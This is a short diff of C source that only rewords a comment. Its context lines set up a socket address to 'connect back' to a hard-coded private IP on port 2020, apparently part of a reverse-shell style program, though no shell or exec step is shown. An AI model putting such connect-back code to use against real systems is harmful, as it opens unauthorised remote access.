@@ -14,7 +14,7 @@ int main()
 {
 int sock_file_des;							// socket file descriptor
 
-struct sockaddr_in sock_ad;						// node address and port
+struct sockaddr_in sock_ad;						// target's ip address and port
 sock_ad.sin_family = AF_INET; 
 sock_ad.sin_port = htons(2020);						// use port 2020
 sock_ad.sin_addr.s_addr = inet_addr("192.168.85.136");			// connect back to "192.168.85.136"
